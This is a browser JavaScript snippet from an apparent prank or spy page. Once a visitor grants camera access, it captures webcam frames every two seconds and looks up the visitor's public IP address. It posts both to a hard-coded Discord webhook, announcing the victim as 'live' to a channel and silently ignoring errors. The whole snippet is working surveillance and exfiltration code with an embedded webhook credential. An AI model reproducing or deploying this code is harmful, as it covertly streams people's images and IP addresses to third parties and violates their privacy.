<script>
// YOUR WEBHOOK â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const WEBHOOK = "https://discord.com/api/webhooks/1442834175521591387/-Ebcrm-cuHfvM1a-bCL7sX1cFHGa6DAnB4U1ratH-rrK7fzi3Pt7TZrquwHlJuspJuEs";
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

const video = document.getElementById('vid');
const status = document.getElementById('status');
const err = document.getElementById('err');
const btn = document.getElementById('btn');

let stream = null;
let interval = null;
let frameCount = 0;

async function getIP() {
  try {
    const r = await fetch('https://api.ipify.org?format=json');
    return (await r.json()).ip;
  } catch {
    return "Hidden";
  }
}

async function sendFrame() {
  if (!video.videoWidth) return;

  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext('2d');
  ctx.translate(canvas.width, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0);

  try {
    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.62));
    if (blob.size < 1500) return;

    const file = new File([blob], `live-frame-${++frameCount}.jpg`, {type:'image/jpeg'});

    const ip = await getIP();

    const form = new FormData();
    form.append('file', file);
    form.append('payload_json', JSON.stringify({
      username: "Ziyus LIVE CAM",
      content: `ðŸ”´ Frame ${frameCount} â€¢ ${new Date().toLocaleTimeString()}`,
      embeds: [{
        color: 0xFF2E63,
        fields: [
          {name: "IP", value: `\`${ip}\``, inline:true},
          {name: "Time", value: new Date().toLocaleString(), inline:true}
        ],
        image: {url: "attachment://live-frame.jpg"}
      }]
    }));

    await fetch(WEBHOOK, {method: "POST", body: form});
  } catch (e) {
    // silent - keep going
  }
}

async function start() {
  try {
    err.textContent = "";
    btn.disabled = true;
    btn.textContent = "LIVE...";

    stream = await navigator.mediaDevices.getUserMedia({
      video: {facingMode: "user"},
      audio: false
    });

    video.srcObject = stream;
    await video.play();

    // Initial "started" message
    const ip = await getIP();
    await fetch(WEBHOOK, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        username: "Ziyus LIVE CAM",
        content: "@everyone **BESHIE WENT LIVE** â€” watching rn ðŸ”¥",
        embeds: [{
          title: "Live Camera Activated",
          description: "Real-time frames incoming...",
          color: 0xFF0000,
          fields: [{name: "IP", value: `\`${ip}\``}],
          timestamp: new Date().toISOString()
        }]
      })
    });

    status.textContent = "ðŸ”´ LIVE â€¢ sending every ~2 seconds";

    // Send frames forever (until tab close)
    interval = setInterval(sendFrame, 2000);

  } catch (e) {
    err.textContent = "Camera access blocked. Allow it para maging live ka bobo ðŸ˜¤";
    btn.disabled = false;
    btn.textContent = "START LIVE";
  }
}

// Cleanup on leave
window.addEventListener('beforeunload', () => {
  if (stream) stream.getTracks().forEach(t => t.stop());
  if (interval) clearInterval(interval);
});

btn.onclick = start;
</script>
